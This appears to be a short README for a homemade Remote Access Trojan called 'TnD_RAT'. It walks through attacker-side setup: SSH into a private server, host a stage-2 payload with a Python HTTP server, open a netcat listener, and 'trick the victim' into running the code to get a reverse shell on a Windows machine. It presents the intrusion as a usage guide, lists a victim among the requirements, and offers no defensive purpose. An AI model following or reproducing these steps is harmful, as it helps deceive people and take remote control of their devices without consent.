# TnD_RAT
TnD_RAT is a basic Remote Access Trojan that I made from scratch. I've tested to obtain a reverse shell on a Windows machine using it.

## Requirements
* A virtual private server.
* A terminal to run ssh (preferably LINUX).
* A victim.
* My RAT code. 😉😉

## Usage
* Start the server.
* Connect to the server using the RSA id.
* Navigate to the directory where the RSA id is stored.
* Then run the following command to ssh into the server.
```bash 
  ssh -i id_rsa <username>@IP_Address
```
* After connecting to the server, start a python server in the folder containing stage2 payload.
```bash 
python3 -m http.server
```
* Open another terminal.
* SSH into the server again using this terminal by running the above ssh command.
* Set up a listener by using the following command.
```bash 
nc -nlvp <PORT NUMBER>
```
* Now, trick the victim into running our code on his device. (Make sure that the victim is connected to the internet.)

* Woila!!!  You got a reverse shell into the victim's device.
